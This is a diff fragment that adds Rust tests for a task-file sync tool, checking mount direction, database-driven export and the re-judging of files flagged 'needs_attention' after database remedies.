+    {
+        assert!(
+            std::time::Instant::now() < deadline,
+            "the edit never reached the file: {}",
+            fs::read_to_string(&file).unwrap()
+        );
+        // Read faster than the debounce: a watcher that counted a read as activity never went quiet
+        // long enough to ask about the database — as with an editor or a grep reading the file.
+        std::thread::sleep(Duration::from_millis(5));
+    }
+    churning.store(false, std::sync::atomic::Ordering::Relaxed);
+    churn.join().unwrap();
+    stop.store(true, std::sync::atomic::Ordering::Relaxed);
+    watcher.join().unwrap().unwrap();
+}
+
+/// A pass over database changes follows the mount's direction: an import-only mount writes nothing, an
+/// export-only mount writes the edit, and a bound file never written yet is created with its line. And
+/// every write the pass makes is sync's own, or each pass would ask for the next.
+#[test]
+fn a_database_pass_follows_the_mount_s_direction_and_writes_only_as_sync() {
+    for (mode, writes) in [
+        (SyncMode::Import, false),
+        (SyncMode::Export, true),
+        (SyncMode::Bidirectional, true),
+    ] {
+        let dir = real_tempdir();
+        let file = dir.path().join("tasks.md");
+        fs::write(&file, TASKS_MD).unwrap();
+        let db = Db::open_in_memory().unwrap();
+        let mut judged = jkb_sync::FlaggedJudgements::default();
+        mount_dir(
+            &db,
+            "docs/plan",
+            dir.path(),
+            SyncMode::Bidirectional,
+            "tasks",
+            Some("**/*.md"),
+            None,
+            ConflictPolicy::Manual,
+        );
+        sync(&db, "docs/plan").unwrap();
+        mount_dir(
+            &db,
+            "docs/plan",
+            dir.path(),
+            mode,
+            "tasks",
+            Some("**/*.md"),
+            None,
+            ConflictPolicy::Manual,
+        );
+        kb_set_status(&db, &format!("{}#setup", uri_for(&file)), "done");
+        let before = db.read(jkb_core::sync_state::latest_write).unwrap();
+        let report = jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged).unwrap();
+        let exported = fs::read_to_string(&file)
+            .unwrap()
+            .contains("- [x] Set up CI ^setup");
+        assert_eq!(exported, writes, "{mode:?}: {report:?}");
+        if !writes {
+            assert!(report.results.is_empty(), "{mode:?}: {report:?}");
+        }
+        let after = db
+            .read(move |c| jkb_core::sync_state::writes_since(c, before))
+            .unwrap();
+        assert!(
+            !after.by_others,
+            "{mode:?}: the pass wrote as someone other than sync"
+        );
+    }
+
+    // A task filed into a tasks.md that is not on disk yet is written out.
+    let dir = real_tempdir();
+    fs::write(dir.path().join("tasks.md"), TASKS_MD).unwrap();
+    let db = Db::open_in_memory().unwrap();
+    let mut judged = jkb_sync::FlaggedJudgements::default();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    sync(&db, "docs/plan").unwrap();
+    let fresh = dir.path().join("later/tasks.md");
+    let fresh_uri = format!("{}#born", uri_for(&fresh));
+    db.write_txn("cli", move |conn, meta| {
+        let mut new = task::NewTask::new(&fresh_uri, "Born in the database");
+        new.binding = fresh_uri.clone();
+        new.home = "docs/plan/later/tasks.md".to_owned();
+        task::create(conn, meta, &new).map(|_| ())
+    })
+    .unwrap();
+    jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged).unwrap();
+    assert!(
+        fs::read_to_string(&fresh).is_ok_and(|t| t.contains("Born in the database ^born")),
+        "{:?}",
+        fs::read_to_string(&fresh)
+    );
+}
+
+/// A file refused into `needs_attention` is re-judged when the database changes, so the remedy the
+/// refusal names — a database write — clears it.
+#[test]
+fn a_refused_file_is_re_judged_after_its_database_remedy() {
+    let dir = real_tempdir();
+    let tasks = dir.path().join("tasks.md");
+    fs::write(
+        &tasks,
+        "## Plan\n\n- [ ] keep me !p1 ^keep\n- [ ] and me !p2 ^and\n",
+    )
+    .unwrap();
+    let db = Db::open_in_memory().unwrap();
+    let mut judged = jkb_sync::FlaggedJudgements::default();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    sync(&db, "docs/plan").unwrap();
+    let placement: (i64, i64, i64) = db
+        .write_txn("t", |conn, _| {
+            let row = conn.query_row(
+                "SELECT p.item_id, p.namespace_id, p.position FROM placements p JOIN items i ON i.id = p.item_id
+                  WHERE i.content = 'keep me' AND p.role = 'primary'",
+                [],
+                |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?)),
+            )?;
+            conn.execute("DELETE FROM placements WHERE item_id = ?1 AND role = 'primary'", [row.0])?;
+            conn.execute("UPDATE items SET status = 'done' WHERE content = 'and me'", [])?;
+            Ok(row)
+        })
+        .unwrap();
+    assert_eq!(
+        jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged)
+            .unwrap()
+            .count(Outcome::Refused),
+        1
+    );
+    assert_eq!(journal(&db, &uri_for(&tasks)).unwrap().0, "needs_attention");
+    // Another write elsewhere, with nothing changed for this file: judged on the same render, it is not
+    // reconciled — and so not re-archived, re-refused and re-logged — again.
+    db.write_txn("cli", |conn, _| {
+        jkb_core::ns::ensure(conn, "elsewhere")?;
+        Ok(())
+    })
+    .unwrap();
+    assert!(
+        jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged)
+            .unwrap()
+            .results
+            .is_empty(),
+        "a file still refused for the same reason is not reconciled on every pass"
+    );
+
+    // The remedy: put the placement back, in the database.
+    db.write_txn("cli", move |conn, meta| {
+        jkb_core::placement::place(
+            conn,
+            meta,
+            jkb_types::ItemId::new(placement.0),
+            jkb_types::NamespaceId::new(placement.1),
+            jkb_types::PlacementRole::Primary,
+            placement.2,
+        )
+    })
+    .unwrap();
+    jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged).unwrap();
+    assert_eq!(
+        journal(&db, &uri_for(&tasks)).unwrap().0,
+        "ok",
+        "the flag clears once the remedy is applied"
+    );
+    assert!(fs::read_to_string(&tasks).unwrap().contains("- [x] and me"));
+}
+
+/// A file whose check fails is reconciled so the failure is recorded against it, the files after it are
+/// still exported, and a second pass does not reconcile it again while the failure stands.
+#[test]
+fn a_file_whose_check_fails_is_flagged_once_and_does_not_stop_the_pass() {
+    let dir = real_tempdir();
+    fs::create_dir_all(dir.path().join("a")).unwrap();
+    fs::create_dir_all(dir.path().join("b")).unwrap();
+    let broken = dir.path().join("a/tasks.md");
+    let edited = dir.path().join("b/tasks.md");
+    fs::write(&broken, "## A\n- [ ] one ^one\n").unwrap();
+    fs::write(&edited, TASKS_MD).unwrap();
+    let db = Db::open_in_memory().unwrap();
+    let mut judged = jkb_sync::FlaggedJudgements::default();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    sync(&db, "docs/plan").unwrap();
+    // A serializer override this build does not know: the check of `a/tasks.md` cannot render it.
+    let broken_uri = format!("{}#one", uri_for(&broken));
+    db.write_txn("cli", move |conn, meta| {
+        let id = item::id_for_uid(conn, &broken_uri)?.expect("task");
+        binding::set(
+            conn,
+            meta,
+            id,
+            &broken_uri,
+            Some(SyncMode::Bidirectional),
+            Some("no-such"),
+        )
+    })
+    .unwrap();
+    kb_set_status(&db, &format!("{}#setup", uri_for(&edited)), "done");
+
+    let report = jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged).unwrap();
+    assert!(
+        fs::read_to_string(&edited)
+            .unwrap()
+            .contains("- [x] Set up CI ^setup"),
+        "the file after the failing one is exported: {report:?}"
+    );
+    assert_eq!(report.failed().len(), 1, "{report:?}");
+    assert_eq!(
+        journal(&db, &uri_for(&broken)).unwrap().0,
+        "needs_attention"
+    );
+    assert!(
+        jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged)
+            .unwrap()
+            .results
+            .is_empty(),
+        "not reconciled again while the same failure stands"
+    );
+}
+
+/// A refused file is re-judged after ANY remedy the refusal reads from the database, not only one that
+/// changes the render: unbinding the item it names leaves the render as it was. And a file a pass settled
+/// holds no judgement, so a flag another process raises on it later is re-judged by the next pass.
+#[test]
+fn every_remedy_is_re_judged_and_a_settled_file_holds_no_judgement() {
+    let dir = real_tempdir();
+    let tasks = dir.path().join("tasks.md");
+    fs::write(
+        &tasks,
+        "## Plan\n\n- [ ] keep me !p1 ^keep\n- [ ] and me !p2 ^and\n",
+    )
+    .unwrap();
+    let db = Db::open_in_memory().unwrap();
+    let mut judged = jkb_sync::FlaggedJudgements::default();
+    mount_tasks(&db, dir.path(), ConflictPolicy::Manual);
+    sync(&db, "docs/plan").unwrap();
+    db.write_txn("t", |conn, _| {
+        conn.execute(
+            "DELETE FROM placements WHERE role = 'primary'
+               AND item_id = (SELECT id FROM items WHERE content = 'keep me')",
+            [],
+        )?;
+        Ok(())
+    })
+    .unwrap();
+    kb_set_status(&db, &format!("{}#and", uri_for(&tasks)), "done");
+    assert_eq!(
+        jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged)
+            .unwrap()
+            .count(Outcome::Refused),
+        1
+    );
+
+    // The remedy that detaches the item: its binding goes, and the render — which already left it out
+    // — does not change.
+    let keep = format!("{}#keep", uri_for(&tasks));
+    db.write_txn("cli", move |conn, meta| {
+        let id = item::id_for_uid(conn, &keep)?.expect("task");
+        binding::set(conn, meta, id, "managed:", None, None)
+    })
+    .unwrap();
+    jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged).unwrap();
+    assert_eq!(
+        journal(&db, &uri_for(&tasks)).unwrap().0,
+        "ok",
+        "unbinding the item the refusal named clears it"
+    );
+
+    // Settled by that pass, the file holds no judgement: flagged afterwards by someone else with nothing
+    // in the database changed, the next pass re-judges and settles it.
+    let uri = uri_for(&tasks);
+    db.write_txn("other-process", move |conn, meta| {
+        let row = jkb_core::sync_state::get(conn, &uri)?.expect("row");
+        jkb_core::sync_state::upsert(
+            conn,
+            meta,
+            &jkb_core::sync_state::SyncStateWrite {
+                uri: &uri,
+                serializer: &row.serializer,
+                status: "needs_attention",
+                last_synced_hash: row.last_synced_hash.as_deref(),
+                base_blob_hash: row.base_blob_hash.as_deref(),
+                parse_error: Some("could not archive: database is locked"),
+                quarantine_blob_hash: None,
+                document: row.document.as_deref(),
+            },
+        )
+    })
+    .unwrap();
+    jkb_sync::sync_kb_changes(&db, "docs/plan", &mut judged).unwrap();
+    assert_eq!(journal(&db, &uri_for(&tasks)).unwrap().0, "ok");
 }
